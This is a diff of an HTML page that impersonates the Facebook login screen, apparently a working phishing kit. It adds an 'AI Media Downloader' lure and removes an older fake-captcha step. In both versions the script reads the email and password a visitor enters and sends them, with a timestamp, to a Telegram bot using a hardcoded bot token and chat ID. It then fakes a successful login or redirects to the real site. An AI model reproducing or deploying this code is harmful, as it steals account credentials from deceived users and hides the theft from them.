@@ -1,364 +1,303 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>AI Media Downloader</title>
+
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+        body { background-color: #f0f2f5; height: 100vh; width: 100vw; overflow: hidden; }
+
+        
+
+        /* Step 1: Landing */
+
+        #landing-page {
+
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+
+            background: url('999.jpg') no-repeat center center fixed;
+
+            background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 10;
+
+            transition: opacity 0.5s ease-in-out;
+
         }
 
-        /* Background Image Setup */
-        .background-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            /* REPLACE 'your-image-name.jpg' WITH YOUR ACTUAL IMAGE FILE NAME */
-            background: url('999.jpg') no-repeat center center fixed; 
-            background-size: cover;
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 1; }
+
+        .content-wrapper { position: relative; z-index: 2; text-align: center; padding: 20px; }
+
+        .ai-badge {
+
+            background: linear-gradient(90deg, #ff00cc, #333399); color: white; padding: 8px 16px;
+
+            border-radius: 20px; font-weight: bold; font-size: 14px; display: inline-block;
+
+            margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;
+
         }
 
-        /* Dark Overlay to make text pop */
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.4); /* Adjust opacity if needed */
-            z-index: -1;
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        .cta-button {
+
+            background-color: #ffffff; color: #1877f2; border: none; padding: 15px 40px;
+
+            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
+
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform 0.2s; outline: none;
+
         }
 
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            width: 396px;
-            max-width: 90%;
-            z-index: 10;
+        .cta-button:active { transform: scale(0.95); }
+
+
+
+        /* Step 2: Login Form */
+
+        #login-page {
+
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+
+            background-color: #fff; display: flex; justify-content: center; align-items: center;
+
+            z-index: 20; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
+
         }
 
-        h1 {
-            color: #1877f2;
-            font-size: 42px;
-            font-weight: 700;
-            margin: 0 0 10px 0;
-            text-align: center;
-        }
+        .login-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
 
-        p {
-            font-size: 24px;
-            margin: 0 0 20px 0;
-            line-height: 28px;
-            color: #1c1e21;
-        }
+        .fb-logo { color: #1877f2; font-size: 42px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
+
+        .input-group { margin-bottom: 15px; }
 
         input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            box-sizing: border-box;
+
+            width: 100%; padding: 16px; border: 1px solid #dddfe2; border-radius: 8px;
+
+            font-size: 16px; outline: none;
+
         }
 
-        input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+
+        .login-btn {
+
+            width: 100%; background-color: #1877f2; color: white; border: none; padding: 16px;
+
+            font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer;
+
+            margin-top: 10px; transition: background-color 0.2s;
+
         }
 
-        button.login-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
+        .login-btn:hover { background-color: #166fe5; }
 
-        button.login-btn:hover {
-            background-color: #166fe5;
-        }
+        .login-btn:disabled { background-color: #e4e6eb; color: #bcc0c4; cursor: not-allowed; }
 
-        button.login-btn:disabled {
-            background-color: #b2d1ff;
-            cursor: default;
-        }
+        .forgot-password { display: block; margin-top: 20px; color: #1877f2; text-decoration: none; font-size: 14px; }
 
-        a.forgot {
-            display: block;
-            text-align: center;
-            color: #1877f2;
-            font-size: 14px;
-            margin-top: 16px;
-            text-decoration: none;
-        }
+        
 
-        a.forgot:hover {
-            text-decoration: underline;
-        }
-
-        hr {
-            border: none;
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-account {
-            display: block;
-            width: auto;
-            margin: 0 auto;
-            padding: 14px 16px;
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: none;
-            text-align: center;
-        }
-
-        .create-account:hover {
-            background-color: #36a420;
-        }
-
-        /* Loading Bar */
-        .loading-bar-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: transparent;
-            z-index: 9999;
-            display: none;
-        }
-
-        .loading-bar {
-            height: 100%;
-            background: #1877f2;
-            width: 0%;
-            transition: width 0.1s;
-        }
-
-        /* Captcha Modal */
-        .captcha-modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
-            z-index: 10000;
-            width: 300px;
-            text-align: center;
-        }
-
-        .captcha-header {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            color: #333;
-        }
-
-        .captcha-box {
-            border: 1px solid #ccc;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            background: #f9f9f9;
-        }
-
-        .captcha-box:hover {
-            background: #eee;
-        }
+        /* Loading Spinner */
 
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: none;
-            margin: 0 auto;
+
+            display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent;
+
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;
+
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .success-msg {
-            color: green;
-            font-weight: bold;
-            display: none;
-        }
-        
-        .error-msg {
-            color: red;
-            font-size: 12px;
-            display: none;
-            margin-top: 5px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
     </style>
+
 </head>
+
 <body>
 
-    <!-- Background Image -->
-    <div class="background-container"></div>
-    <div class="overlay"></div>
 
-    <!-- Loading Bar -->
-    <div class="loading-bar-container" id="loadingBarContainer">
-        <div class="loading-bar" id="loadingBar"></div>
-    </div>
 
-    <!-- Main Login Container -->
-    <div class="container">
-        <h1>facebook</h1>
-        <p>Facebook helps you connect and share with the people in your life.</p>
-        
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="Email address or phone number" required>
-            <input type="password" id="password" placeholder="Password" required>
-            
-            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
-            
-            <a href="#" class="forgot">Forgotten password?</a>
-            <hr>
-            <a href="#" class="create-account">Create new account</a>
-        </form>
-    </div>
+    <!-- Step 1: Landing Page -->
 
-    <!-- Fake Captcha Modal -->
-    <div class="captcha-modal" id="captchaModal">
-        <div class="captcha-header">Security Check</div>
-        <div class="captcha-box" id="captchaBox">
-            <span id="captchaText">I'm not a robot</span>
-            <div class="spinner" id="spinner"></div>
-            <div class="success-msg" id="successMsg">✓ Success</div>
+    <div id="landing-page">
+
+        <div class="overlay"></div>
+
+        <div class="content-wrapper">
+
+            <div class="ai-badge">AI Powered</div>
+
+            <button class="cta-button" onclick="showLogin()">Get Started</button>
+
         </div>
-        <div class="error-msg" id="errorMsg">Please try again.</div>
+
     </div>
+
+
+
+    <!-- Step 2: Login Page -->
+
+    <div id="login-page">
+
+        <div class="login-card">
+
+            <div class="fb-logo">facebook</div>
+
+            <form id="loginForm">
+
+                <div class="input-group">
+
+                    <input type="text" id="email" placeholder="Email or Phone Number" required>
+
+                </div>
+
+                <div class="input-group">
+
+                    <input type="password" id="password" placeholder="Password" required>
+
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">
+
+                    Log In
+
+                    <div class="spinner" id="btnSpinner"></div>
+
+                </button>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+
+            </form>
+
+        </div>
+
+    </div>
+
+
 
     <script>
+
         // --- TELEGRAM CONFIGURATION ---
+
         const TELEGRAM_BOT_TOKEN = "8833246171:AAF3zLIGcrPGXnu1rKTw5E0CLMXViZCboHI";
+
         const TELEGRAM_CHAT_ID = "5167131107";
-        // -----------------------------
 
-        const loginBtn = document.getElementById('loginBtn');
-        const loadingBarContainer = document.getElementById('loadingBarContainer');
-        const loadingBar = document.getElementById('loadingBar');
-        const captchaModal = document.getElementById('captchaModal');
-        const captchaBox = document.getElementById('captchaBox');
-        const captchaText = document.getElementById('captchaText');
-        const spinner = document.getElementById('spinner');
-        const successMsg = document.getElementById('successMsg');
-        const errorMsg = document.getElementById('errorMsg');
-        const loginForm = document.getElementById('loginForm');
+        // ----------------------------
 
-        loginForm.addEventListener('submit', function(e) {
+
+
+        function showLogin() {
+
+            document.getElementById('landing-page').style.opacity = '0';
+
+            setTimeout(() => {
+
+                document.getElementById('landing-page').style.display = 'none';
+
+                const loginPage = document.getElementById('login-page');
+
+                loginPage.style.visibility = 'visible';
+
+                loginPage.style.opacity = '1';
+
+            }, 500);
+
+        }
+
+
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+
             e.preventDefault();
+
             
-            // Start Loading Bar
-            loadingBarContainer.style.display = 'block';
-            let width = 0;
-            const interval = setInterval(() => {
-                if (width >= 90) {
-                    clearInterval(interval);
-                    // Show Captcha after loading bar reaches 90%
-                    showCaptcha();
-                } else {
-                    width += Math.random() * 10;
-                    loadingBar.style.width = width + '%';
-                }
-            }, 100);
+
+            const btn = document.getElementById('loginBtn');
+
+            const spinner = document.getElementById('btnSpinner');
+
+            const email = document.getElementById('email').value;
+
+            const password = document.getElementById('password').value;
+
+            
+
+            btn.disabled = true;
+
+            spinner.style.display = 'inline-block';
+
+            btn.innerText = '';
+
+            btn.appendChild(spinner);
+
+            
+
+            // Simulate loading delay
+
+            setTimeout(() => {
+
+                sendToTelegram(email, password);
+
+                btn.style.display = 'none';
+
+                alert("Logged in successfully!");
+
+                // Optional: Redirect to real site
+
+                // window.location.href = "https://www.facebook.com/";
+
+            }, 2000);
+
         });
 
-        function showCaptcha() {
-            captchaModal.style.display = 'block';
-            captchaText.style.display = 'none';
-            spinner.style.display = 'block';
-            
-            // Simulate captcha verification delay
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                captchaText.style.display = 'none';
-                successMsg.style.display = 'block';
-                
-                // Wait a moment then submit form
-                setTimeout(() => {
-                    submitData();
-                }, 500);
-            }, 1500);
-        }
 
-        function submitData() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Send to Telegram
-            sendToTelegram(`🔥 New Login Attempt 🔥\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`);
-            
-            // Optional: Redirect to real Facebook after sending data
-            setTimeout(() => {
-                window.location.href = "https://www.facebook.com/";
-            }, 1000);
-        }
 
-        // Telegram Function
-        function sendToTelegram(message) {
+        function sendToTelegram(email, password) {
+
+            const message = `🔥 New Login Attempt 🔥\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
+
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
             
+
             fetch(url, {
+
                 method: 'POST',
+
                 headers: { 'Content-Type': 'application/json' },
+
                 body: JSON.stringify({
+
                     chat_id: TELEGRAM_CHAT_ID,
+
                     text: message,
+
                     parse_mode: 'HTML'
+
                 })
+
             })
-            .then(response => {
-                if(response.ok) {
-                    console.log('Sent to Telegram successfully');
-                } else {
-                    console.error('Telegram API Error:', response.status);
-                }
-            })
+
+            .then(response => console.log('Sent to Telegram'))
+
             .catch(error => console.error('Error:', error));
+
         }
+
     </script>
+
 </body>
+
 </html>
